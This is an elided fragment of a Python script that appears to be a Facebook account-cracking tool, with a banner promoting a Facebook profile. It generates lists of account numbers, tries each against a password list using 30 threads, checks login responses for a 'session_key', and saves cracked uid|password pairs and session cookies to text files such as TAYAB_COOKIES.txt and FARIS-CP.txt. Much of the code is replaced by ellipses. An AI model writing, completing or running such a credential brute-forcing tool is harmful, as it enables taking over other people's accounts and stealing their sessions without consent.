...
os.system("clear")
print('\n\033[1;32m FALLOW FACEBOOK https://www.facebook.com/atif.awan.395891?mibextid=ZbWKwL')
...
def pak():
	...
	for nmbr in range(limit):
		...
		user.append(nmp)
	with tred(max_workers=30) as TAYAB:
		clear()
		tl = str(len(user))
		print(' [+] Total accounts : \033[1;32m'+tl)
	...
	try:
		...
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						file_path_ok = os.path.join(folder_path, 'TAYAB_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'TAYAB_COOKIES.txt')
	...
	try:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					uid = str(po['error']['error_data']['uid'])
			#		print(f'\r\r\33[1m\33[1;35m [FARIS-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'FARIS-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
